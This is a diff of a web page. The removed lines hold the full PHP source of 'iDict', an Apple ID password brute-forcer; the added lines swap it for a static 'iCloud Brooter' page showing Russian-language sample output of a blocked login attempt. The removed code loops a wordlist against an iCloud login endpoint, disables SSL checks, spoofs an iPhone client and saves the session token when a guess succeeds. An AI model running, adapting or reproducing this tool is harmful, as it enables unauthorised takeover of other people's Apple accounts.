@@ -3,172 +3,37 @@
 <head>
 <meta charset="utf-8">
 
-<title>iDict</title>
+<title>iCloud Brooter | iHateApple</title>
 
-<link rel="icon" type="image/vnd.microsoft.icon"
-     href="images/favicon.ico" />
 
+
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:1420825962,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok2v=1613a3a185/"},atok:"eb79b374014e1b09dc868279d62dbb4f",petok:"051f34046d926912f0f10f05a1c4a0d3898394aa-1421088282-1800",zone:"ihateapple.co.uk",rocket:"0",apps:{}}];CloudFlare.push({"apps":{"ape":"28f6e0bc1b95ca79cc0fc76c3f281ea3"}});!function(a,b){a=document.createElement("script"),b=document.getElementsByTagName("script")[0],a.async=!0,a.src="//ajax.cloudflare.com/cdn-cgi/nexp/dok2v=919620257c/cloudflare.min.js",b.parentNode.insertBefore(a,b)}()}}catch(e){};
+//]]>
+</script>
 <style type="text/css">
 body {
-    background-color: #242424;
+    background-color: #FFFFFF;
 }
 table, th, td {
     border: 1px solid black;
 }
 h1 {
-    color: #00ff00;
+    color: #000000;
 } 
 </style>
 </head>
 
 <body>
 <center>
-<img src="images/Xoxo.jpg">
 
 
-
-
-
-<br>
-<b><h1>=================================================
-<br>|  iDict Apple ID BruteForcer and Account Management Tool  |
-<br>=================================================
-<b><br>
-
-<?php ob_implicit_flush(true);
-ob_end_flush();
-ini_set('max_execution_time', 0); //no server timeout limit ?> 
-
-
-
-
-
-<?php
-
-$appleid = $_REQUEST['txtFullName'];        
-
-$plist = file_get_contents('./files/config.plist');
-$xml = simplexml_load_string($plist);
-
-$url = $xml->dict->dict->string[23];                      //the droid were looking for
-         
-$file_handle = fopen("./files/wordlist.txt", "r");
-
-while (!feof($file_handle)) { 
-
-$ch = curl_init();    
-
-$line_of_text = fgets($file_handle); 
-$password = rtrim($line_of_text);
-  
-$payload =
-'<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-	<key>apple-id</key>
-	<string>'. $appleid .'</string>
-	<key>client-id</key>
-	<string></string>
-	<key>delegates</key>
-	<dict>
-		<key>com.apple.gamecenter</key>
-		<dict/>
-		<key>com.apple.mobileme</key>
-		<dict/>
-		<key>com.apple.private.ids</key>
-		<dict>
-			<key>protocol-version</key>
-			<string>4</string>
-		</dict>
-	</dict>
-	<key>password</key>
-	<string>'. $password .'</string>
-</dict>
-</plist>';
-
-
-
-
-echo "Trying URL:<br>" . "~=~" . $url. "~=~" . "<br></b>";
-  
-echo "Trying Password:<br>" . "~=~" . $line_of_text . "~=~" . "<br><br>"; 
-
-
-curl_setopt($ch, CURLOPT_URL,$url); 
-curl_setopt($ch, CURLOPT_POST, true); 
-curl_setopt($ch,CURLOPT_ENCODING, ''); 
-curl_setopt($ch, CURLOPT_VERBOSE, true); 
-curl_setopt($ch, CURLINFO_HEADER_OUT, true);  
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);    
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);   
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);   
-curl_setopt($ch, CURLOPT_POSTFIELDS, $payload); 
-curl_setopt($ch, CURLOPT_USERAGENT, 'Accounts/113 CFNetwork/672.0.8 Darwin/14.0.0');  
-curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-    'Proxy-Connection: keep-alive',
-    'Accept: */*',
-    'Accept-Encoding: gzip, deflate',               
-    'Content-Type: text/plist',
-    'Accept-Language: en-us',
-    'X-MMe-Country: US',
-    'X-MMe-Client-Info: <iPhone4,1> <iPhone OS;7.0.4;11B554a> <com.apple.AppleAccount/1.0 (com.apple.Accounts/113)>',
-    'Content-length: ' . strlen($payload),
-    'Connection: keep-alive'
-));                                                
-
-$got = 0;
-$response = curl_exec($ch); 
-
-$pos = 0;
-$pos = strpos($response, "delegates");
-if($pos > 0) {
-	$got = 1;
-	echo "<b>Password Found!!</b><br>";
-}
-         
-$pos = 0;                              
-$pos = strpos($response, "disabled");
-if($pos > 0) {
-	$got = 1;
-	echo "<b>Account Blocked</b><br>";
-	exit(0);
-}
-
-$pos = 0;
-$pos = strpos($response, "incorrectly");
-if($pos > 0) {
-	$got = 1;
-	echo "<b>Password Incorrect</b><br>";
-}
  
-if($got == 0) {
-	echo $response;
-	//echo "<br><br>Headers Debugging Info:<br></br>";
-	//echo curl_getinfo($ch, CURLINFO_HEADER_OUT);
-}
-
-if ( $error = curl_error($ch) )
-echo 'ERROR: ',$error;
-
-curl_close($ch); 
 
 
-if (strpos($response, "delegates") !== false)
-    {
-		echo "<center>Generating Token....</center>";
-		file_put_contents('./token.plist', $response);
-        echo "<center>Saved to Disk...</center>";
-        die( "Success! The password is: {$line_of_text}" );
-	
-    }else{
-    echo "Incorrect Trying Next<br>";
-	
-	}
-}
-fclose($file_handle);
-?>
 
 
-</body>
-</html>
+
+Подключен к:<br>https://setup.icloud.com/setup/iosbuddy/loginDelegates<br></b>Пробую зайти с паролем:<br>Password1
+<br><br><b>Аккаунт заблокирован</b><br>
